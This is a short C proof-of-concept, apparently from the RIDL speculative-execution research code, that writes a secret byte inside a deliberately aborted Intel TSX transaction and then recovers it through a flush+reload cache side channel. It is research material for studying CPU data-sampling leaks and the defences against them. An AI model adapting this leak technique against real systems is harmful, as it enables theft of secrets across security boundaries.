/*
Leak values written inside an aborted TSX transaction.

Notes:
 * most obvious explanation: store buffers, but Intel say we don't leak from store buffers.

Expected output:

$ ./cross_transaction_leak
3800: 89 (?)
*/

#include "ridl.h"

#define SECRET_VALUE 0x89
#define VICTIM_OFFSET 20 /* write secret to this offset */
#define READ_OFFSET (64+20) /* leak from this offset */

int main(int argc, char *argv[]) {
	ALLOC_BUFFERS();

	for (size_t i = 0; i < ITERS; ++i) {
		flush(reloadbuffer);

		// STEP ONE: We write a value inside a TSX transaction, which aborts.

		asm volatile("xbegin abort1\n":::"rax");
		for (unsigned int n = 0; n < 1024; ++n) { // should ideally be >=56 I guess?
			*(volatile unsigned char *)(privatebuf + (0x40*n) + VICTIM_OFFSET) = SECRET_VALUE /*+ (n & 0x3f)*/;
		}
		// force abort
		asm volatile(
			"loop:pause\njmp loop\n"
			"xend\n"
			"abort1:\n"
			);

		// STEP TWO: We leak the value despite the aborted transaction.

		// store buffer?
		asm volatile( "mfence\n" );
		tsxabort_leak_clflush(leak + READ_OFFSET, reloadbuffer, reloadbuffer);

		reload(reloadbuffer, results);
	}

	print_results(results);
}

